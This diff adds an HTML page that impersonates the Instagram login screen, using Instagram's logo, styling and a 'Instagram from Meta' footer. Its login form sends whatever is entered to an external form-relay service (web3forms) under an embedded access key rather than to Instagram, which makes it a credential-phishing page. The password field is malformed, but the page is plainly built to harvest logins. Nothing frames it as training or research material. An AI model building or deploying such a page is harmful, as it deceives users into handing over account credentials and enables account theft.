@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Arial', sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      width: 350px;
+      padding: 40px;
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 175px;
+      margin-bottom: 20px;
+    }
+
+    .login-container form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .login-container input {
+      margin: 10px 0;
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      background-color: #fafafa;
+    }
+
+    .login-container button {
+      background-color: #0095f6;
+      color: white;
+      padding: 10px;
+      font-size: 14px;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-container .divider {
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      text-align: center;
+    }
+
+    .login-container .divider::before,
+    .login-container .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+
+    .login-container .divider::before {
+      margin-right: 10px;
+    }
+
+    .login-container .divider::after {
+      margin-left: 10px;
+    }
+
+    .login-container a {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .login-container a:hover {
+      text-decoration: underline;
+    }
+
+    .forgot-password {
+      margin-top: 10px;
+    }
+
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      color: #999;
+      font-size: 12px;
+    }
+
+    .footer a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+    
+    <!-- Login Form -->
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="c369704e-3c6c-4f6a-8dc0-2816c666575b">
+      
+      <!-- Username or email field -->
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+
+      <!-- Password field (not secure for production use) -->
+      <input type="#" name="#" placeholder="*********" required>
+
+      <!-- Honeypot field for spam protection -->
+      <input type="text" name="bot-field" style="display:none;" tabindex="-1">
+
+      <!-- Submit Button -->
+      <button type="submit">Log In</button>
+    </form>
+
+    <div class="divider">OR</div>
+    
+    <!-- Social Media Login -->
+    <a href="#"><i class="fab fa-facebook-f"></i> Log in with Facebook</a>
+
+    <!-- Forgot Password -->
+    <a href="#" class="forgot-password">Forgot password?</a>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>Don't have an account? <a href="#">Sign up</a></p>
+    <p>© 2024 Instagram from Meta</p>
+  </div>
+
+  <!-- Font Awesome for Facebook Icon -->
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</body>
+</html>
